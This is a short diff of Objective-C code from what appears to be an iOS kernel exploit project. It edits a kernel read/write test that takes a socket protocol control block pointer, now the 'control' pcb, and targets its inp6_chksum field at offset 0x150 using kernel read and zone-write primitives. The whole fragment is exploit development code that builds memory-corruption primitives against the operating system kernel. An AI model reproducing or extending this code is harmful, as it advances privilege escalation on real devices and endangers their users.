@@ -713,11 +713,11 @@
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         NSMutableString *r = [NSMutableString string];
         [r appendString:@"\n=== KRW write test (kwrite_zone_element_qword) ===\n"];
-        extern uint64_t darksword_rw_socket_pcb(void);
+        extern uint64_t darksword_control_pcb(void);
         extern uint64_t early_kread64(uint64_t where);
         extern krw_zone_verdict kwrite_zone_element_qword(uint64_t dst, uint64_t value,
                                                           uint64_t objBase, uint64_t objSize);
-        uint64_t pcb = darksword_rw_socket_pcb();
+        uint64_t pcb = darksword_control_pcb();  // CONTROL pcb, not rwSocketPcb
         if (pcb) {
             [r appendFormat:@"  darksword pcb = 0x%016llx\n", pcb];
             uint64_t chksumAddr = pcb + 0x150;  // inp6_chksum
